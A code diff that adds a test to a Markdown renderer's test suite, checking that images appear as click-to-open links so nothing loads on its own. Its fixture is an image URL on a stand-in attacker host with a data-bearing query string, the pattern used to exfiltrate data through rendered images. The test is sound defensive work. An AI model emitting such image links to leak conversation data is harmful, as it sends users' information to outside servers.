@@ -30,6 +30,20 @@ describe('Markdown', () => {
     }
   })
 
+  it('shows an image as a link, so nothing loads until it is clicked', () => {
+    const root = rendered(
+      '![stock chart](https://evil.example/x.png?q=SP-NX12L) and ![](https://evil.example/y.png)',
+    )
+    expect(root.querySelector('img')).toBeNull()
+    const links = Array.from(root.querySelectorAll('a'))
+    expect(links.map((link) => link.textContent)).toEqual([
+      'stock chart',
+      'https://evil.example/y.png',
+    ])
+    expect(links[0]).toHaveAttribute('href', 'https://evil.example/x.png?q=SP-NX12L')
+    expect(links[0]).toHaveAttribute('target', '_blank')
+  })
+
   it('opens ordinary links in a new tab without giving it this page', () => {
     const link = rendered('[docs](https://example.com/docs)').querySelector('a')
     expect(link).toHaveAttribute('href', 'https://example.com/docs')
